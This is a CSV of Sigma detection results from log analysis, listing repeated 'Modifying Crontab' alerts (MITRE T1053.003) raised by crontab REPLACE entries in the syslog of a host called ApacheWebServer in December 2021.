rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:18,T1053.003,timestamp_utc=2021-12-08 10:02:18; timestamp=Dec  8 10:02:18; host=ApacheWebServer; process=crontab; pid=12498; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=620,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12504; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=622,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12508; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=624,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:19,T1053.003,timestamp_utc=2021-12-08 10:02:19; timestamp=Dec  8 10:02:19; host=ApacheWebServer; process=crontab; pid=12514; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=626,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:20,T1053.003,timestamp_utc=2021-12-08 10:02:20; timestamp=Dec  8 10:02:20; host=ApacheWebServer; process=crontab; pid=12525; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=629,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:04,T1053.003,timestamp_utc=2021-12-08 15:02:04; timestamp=Dec  8 15:02:04; host=ApacheWebServer; process=crontab; pid=24508; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1295,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24513; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1297,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24518; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1299,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24522; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1301,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24525; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1303,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24532; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1305,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24537; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1307,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24541; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1309,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24544; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1311,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24547; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1313,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24550; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1315,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24553; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1317,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24556; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1319,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24559; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1321,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24563; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1323,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24566; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1325,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24569; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1327,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24572; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1329,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24575; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1331,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24578; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1333,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24581; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1335,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24584; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1337,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24587; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1339,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24590; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1341,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24593; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1343,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24596; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1345,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24599; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1347,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24602; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1349,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24605; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1351,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24608; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1353,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:13,T1053.003,timestamp_utc=2021-12-08 15:02:13; timestamp=Dec  8 15:02:13; host=ApacheWebServer; process=crontab; pid=24611; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1355,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:13,T1053.003,timestamp_utc=2021-12-08 15:02:13; timestamp=Dec  8 15:02:13; host=ApacheWebServer; process=crontab; pid=24628; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1357,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:14,T1053.003,timestamp_utc=2021-12-08 15:02:14; timestamp=Dec  8 15:02:14; host=ApacheWebServer; process=crontab; pid=24631; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1359,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24642; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1361,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24645; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1363,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24649; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1365,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24652; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1367,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24655; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1369,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24659; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1371,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24663; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1373,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:17,T1053.003,timestamp_utc=2021-12-08 15:02:17; timestamp=Dec  8 15:02:17; host=ApacheWebServer; process=crontab; pid=24667; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1375,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:17,T1053.003,timestamp_utc=2021-12-08 15:02:17; timestamp=Dec  8 15:02:17; host=ApacheWebServer; process=crontab; pid=24672; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1377,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24679; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1379,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24685; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1381,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24690; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1383,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24695; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1385,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24698; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1387,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24702; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1389,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:20,T1053.003,timestamp_utc=2021-12-08 15:02:20; timestamp=Dec  8 15:02:20; host=ApacheWebServer; process=crontab; pid=24706; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1391,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:21,T1053.003,timestamp_utc=2021-12-08 15:02:21; timestamp=Dec  8 15:02:21; host=ApacheWebServer; process=crontab; pid=24713; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1394,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
